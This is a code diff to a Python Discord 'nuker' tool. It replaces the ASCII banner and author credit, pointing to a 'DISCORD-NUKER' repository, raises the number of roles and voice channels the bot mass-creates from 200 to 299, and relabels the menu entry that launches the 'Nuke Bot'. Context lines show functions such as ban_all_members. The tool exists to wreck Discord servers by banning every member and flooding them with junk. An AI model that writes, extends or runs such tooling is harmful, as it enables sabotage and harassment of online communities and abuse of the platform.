@@ -16,15 +16,19 @@ clear = lambda: system('cls') if os_name == 'nt' else system('clear')
 def _input(text):print(text, end='');return input()
 
 baner = f'''
-╭╮╱╭╮╱╱╱╱╱╭╮╭━╮╱╱╭━━━╮╱╱╱╱╭╮
-┃┃╱┃┃╱╱╱╱╱┃┃┃╭╯╱╱┃╭━╮┃╱╱╱╭╯┃
-┃╰━╯┣━━┳━━┫╰╯╯╭━━┫╰━╯┣╮╱╭╋╮┃
-┃╭━╮┃╭╮┃╭━┫╭╮┃┃┃━┫╭╮╭┫┃╱┃┃┃┃
-┃┃╱┃┃╭╮┃╰━┫┃┃╰┫┃━┫┃┃╰┫╰━╯┣╯╰╮
-╰╯╱╰┻╯╰┻━━┻╯╰━┻━━┻╯╰━┻━╮╭┻━━╯
-╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
-╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
-{y}Made by: {g}https://github.com/hacker999-byte'''
+baner = f'''
+██████╗░██████╗░██╗░░░██╗██████╗░██╗░█████╗░███████╗
+
+██╔══██╗██╔══██╗██║░░░██║██╔══██╗██║██╔══██╗██╔════╝
+
+██████╔╝██████╔╝██║░░░██║██████╔╝██║██║░░██║█████╗░░
+
+██╔═══╝░██╔══██╗██║░░░██║██╔══██╗██║██║░░██║██╔══╝░░
+
+██║░░░░░██║░░██║╚██████╔╝██║░░██║██║╚█████╔╝███████╗
+
+╚═╝░░░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░╚════╝░╚══════╝
+{y}Made by: {g}https://github.com/YeeCrimson/DISCORD-NUKER'''
 
 
 
@@ -61,7 +65,7 @@ async def ban_all_members(guild):
 
 async def create_roles(guild, name):
     created = 0
-    for _ in range(200 - len(guild.roles)):
+    for _ in range(299 - len(guild.roles)):
         try:
             await guild.create_role(name=name)
             created += 1
@@ -71,7 +75,7 @@ async def create_roles(guild, name):
 
 async def create_voice_channels(guild, name):
     created = 0
-    for _ in range(200 - len(guild.channels)):
+    for _ in range(299 - len(guild.channels)):
         try:
             await guild.create_voice_channel(name=name)
             created += 1
@@ -100,7 +104,7 @@ while True:
 {baner}                
 {c}--------------------------------------------
 {b}[Menu]
-    {y}└─[1] {m}- {g}Run Setup Nuke Bot
+    {y}└─[1] {m}- {g} Subscribe To Prurioe
     {y}└─[2] {m}- {g}Exit
 {y}====>{g}''')
     if choice == '1':
